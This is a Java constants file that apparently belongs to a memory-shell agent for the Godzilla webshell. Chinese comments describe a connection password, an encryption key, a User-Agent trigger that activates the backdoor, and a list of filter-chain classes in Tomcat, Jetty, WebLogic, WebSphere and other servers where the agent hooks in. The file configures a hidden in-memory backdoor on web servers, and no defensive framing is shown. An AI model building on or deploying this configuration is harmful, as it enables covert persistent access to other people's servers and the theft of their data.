package com;

import java.io.IOException;
import java.util.ArrayList;
import java.util.logging.FileHandler;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.logging.SimpleFormatter;

public class Constant001 {
    // 哥斯拉链接密码
    public static final String PASSWORD = "pass";

    // 哥斯拉加密key
    public static final String SECRET_KEY = "key";

    // agent调试日志文件，会在执行agent同一目录下生成
    public static final String LOG_FILENAME = "agentLog.txt";

    // 日志文件是否为追加模式
    public static final boolean LOG_FILENAME_APPEND_SWITCH = true;

    // 请求头参数配置
    public static final String HEADER_PARAM = "User-Agent";

    // 请求头参数值配置，请求头UA参数值包含 HEADER_PARAM_VALUE 即可，不缺分大小写。
    public static final String HEADER_PARAM_VALUE = "agent";

    // 打印关键日志信息，AgentLogger注入之后 Web 服务器显示bean名称
    public static final Logger logger = Logger.getLogger("AgentLogger");


    // SpringMVC框架下Web中间件在进入自定义Filter之前最后一个Filter
    public static final ArrayList<String> WEB_SERVER_LIST = new ArrayList<String>() {{
        add("org.apache.catalina.core.ApplicationFilterChain");         // Tomcat / GlassFish
        add("io.undertow.servlet.core.ManagedFilter");                  // Undertow
        add("org.eclipse.jetty.servlet.FilterHolder");                  // Jetty    jdk8
        add("org.eclipse.jetty.ee10.servlet.FilterHolder");             // Jetty    jdk17
        add("weblogic.servlet.internal.FilterChainImpl");               // WebLogic
        add("com.caucho.server.dispatch.FilterChainImpl");              // Resin
        add("com.ibm.ws.webcontainer.filter.WebAppFilterManager");      // WebSphere
        add("com.apusic.web.filter.FilterChainImpl");                   // Apusic
        add("org.apache.catalina.core.ApplicationFilterChain");         // BES
        add("com.inforsuite.web.filter.FilterChainImpl");               // InforSuite
        add("com.tongweb.catalina.core.ApplicationFilterChain");        // TongWeb
    }};

    // 初始化日志配置
    static {
        try {
            FileHandler fh = new FileHandler(LOG_FILENAME, LOG_FILENAME_APPEND_SWITCH); // 追加模式
            fh.setFormatter(new SimpleFormatter());
            logger.addHandler(fh);
            logger.setUseParentHandlers(true); // 输出到控制台
            logger.setLevel(Level.INFO);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
